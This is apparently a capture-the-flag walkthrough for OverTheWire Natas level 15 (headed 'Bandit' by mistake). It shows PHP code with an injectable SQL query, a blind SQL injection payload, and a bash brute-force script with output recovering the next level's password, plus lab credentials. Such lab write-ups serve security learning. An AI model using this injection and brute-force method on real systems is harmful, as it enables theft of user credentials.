# BANDIT LEVEL 15

```
http://overthewire.org/wargames/natas/natas15.html
```

```
Username: natas15
Password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
URL:      http://natas15.natas.labs.overthewire.org
```

<img src='index.jpg' width=500px>

### SOLUTION

#### CODE INSPECTION

```
<html> 
<head> 
<!-- This stuff in the header has nothing to do with the level --> 
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /> 
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script> 
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script> 
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script> 
<script>var wechallinfo = { "level": "natas15", "pass": "<censored>" };</script></head> 
<body> 
<h1>natas15</h1> 
<div id="content"> 
<? 

/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas15', '<censored>'); 
    mysql_select_db('natas15', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) > 0) { 
        echo "This user exists.<br>"; 
    } else { 
        echo "This user doesn't exist.<br>"; 
    } 
    } else { 
        echo "Error in query.<br>"; 
    } 

    mysql_close($link); 
} else { 
?> 

<form action="index.php" method="POST"> 
Username: <input name="username"><br> 
<input type="submit" value="Check existence" /> 
</form> 
<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
```

From the code we observe:
- a code comment that suggests our DB "users" has two columns: "username"
  and "password"
- a SQL SELECT statement that searches to see if the given username exists
  in the database

Let's see if our target username `natas16` is in the database because if so,
it implies that we need to extract its password some how..

```
http://natas15.natas.labs.overthewire.org/?username=natas16&debug
```

```
$ curl 'http://natas15.natas.labs.overthewire.org/?username=natas16&debug' -H 'Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas15", "pass": "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J" };</script></head>
<body>
<h1>natas15</h1>
<div id="content">
Executing query: SELECT * from users where username="natas16"<br>This user exists.<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

So we confirm that `natas16` exists in the database.

#### BLIND SQL INJECTION

If we perform a SQL injection that sneaks a password test into the query, we
can keep sending requests to the webapp to see if the username/passwd combo
we supplied returns "The user exists" string (which means a successful SQL
query against the database which means we guessed a valid user + password
combination).

The SQL `LIKE` operation will help speed up our seach as we can do a pattern
match search starting at the first charactor and looking for success and then
moving on character by character until we have found 32 characters (the length
of prior level passwords).

Our SQL injection will be something like this:

```
USERNAME='natas16" AND password LIKE BINARY "$PW%'
```

.. where `$PW` is the pattern we are testing as that will result in the query:

```
SELECT * from users where username="natas16" AND password LIKE BINARY "$PW%"
```

#### BRUTE FORCE

Wrote the following script to help with the process..

```
$ cat script.sh
#! /bin/bash

rawurlencode() {
  local string="${1}"
  local strlen=${#string}
  local encoded=""
  local pos c o

  for (( pos=0 ; pos<strlen ; pos++ )); do
     c=${string:$pos:1}
     case "$c" in
        [-_.~a-zA-Z0-9] ) o="${c}" ;;
        * )               printf -v o '%%%02x' "'$c"
     esac
     encoded+="${o}"
  done
  echo "${encoded}"    # You can either set a return variable (FASTER)
  REPLY="${encoded}"   #+or echo the result (EASIER)... or both... :p
}

export PASSWORD
export COUNT


# we assume the password length is 32
for i in {0..31}
do

  # loop through all valid possible characters
  for CH in {{0..9},{a..z},{A..Z}}
  do
    PASSWORD[$i]=$CH
    TESTSTRING=$(printf "%s" "${PASSWORD[@]}")

    #
    # our SQL injection is USERNAME='natas16" AND password LIKE BINARY "$PW%'
    #
    # SELECT * from users where username="natas16" AND password LIKE BINARY "$PW%"
    #
    export USERNAME="$( rawurlencode 'natas16" AND password LIKE BINARY "' )$TESTSTRING%"

    # the last echo'ed $TESTSTRING would represent the working usr/passwd combo
    echo "PASSWORD: $TESTSTRING"

    curl --silent \
      "http://natas15.natas.labs.overthewire.org/?username=$USERNAME%&debug" \
      -H 'Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==' \
      | grep "This user exists" >/dev/null

    if [ $? -eq 0 ]; then
      # if the string "This user exists." it means our user+pw combo worked
      # and we can move onto the next character
      break;
    fi
  done

done
```

```
$ ./script.sh
PASSWORD: 0
PASSWORD: 1
PASSWORD: 2
PASSWORD: 3
PASSWORD: 4
PASSWORD: 5
PASSWORD: 6
PASSWORD: 7
PASSWORD: 8

<...>

PASSWORD: WaIHEacj63wnNIBRM
PASSWORD: WaIHEacj63wnNIBRN
PASSWORD: WaIHEacj63wnNIBRO
PASSWORD: WaIHEacj63wnNIBRO0
PASSWORD: WaIHEacj63wnNIBRO1
PASSWORD: WaIHEacj63wnNIBRO2

<...>

PASSWORD: WaIHEacj63wnNIBROHeqi3p9t0m5nhmb
PASSWORD: WaIHEacj63wnNIBROHeqi3p9t0m5nhmc
PASSWORD: WaIHEacj63wnNIBROHeqi3p9t0m5nhmd
PASSWORD: WaIHEacj63wnNIBROHeqi3p9t0m5nhme
PASSWORD: WaIHEacj63wnNIBROHeqi3p9t0m5nhmf
PASSWORD: WaIHEacj63wnNIBROHeqi3p9t0m5nhmg
PASSWORD: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```
